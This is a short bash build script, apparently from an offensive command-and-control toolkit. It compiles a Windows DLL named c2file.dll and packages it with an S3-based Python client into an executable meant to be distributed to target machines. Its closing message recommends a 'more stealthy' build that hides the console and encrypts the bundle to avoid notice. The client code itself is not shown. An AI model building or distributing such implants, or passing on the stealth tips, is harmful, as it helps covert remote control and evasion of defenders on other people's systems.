#!/bin/bash
i686-w64-mingw32-gcc -shared c2file_dll.c -o c2file.dll
python -m PyInstaller -F -r c2file.dll s3_client.py
echo '[=] Complete. Distribute dist/s3_client.exe to clients as required.'
echo '-----------------------'
echo '|        NOTE         |'
echo '----------------------'
echo 'This is compiled unobfuscated. To create a more stealthy version, use:'
echo 'python -m PyInstaller --no-console --key=SomeSixteenChars -F -r c2file.dll s3_client.py'
echo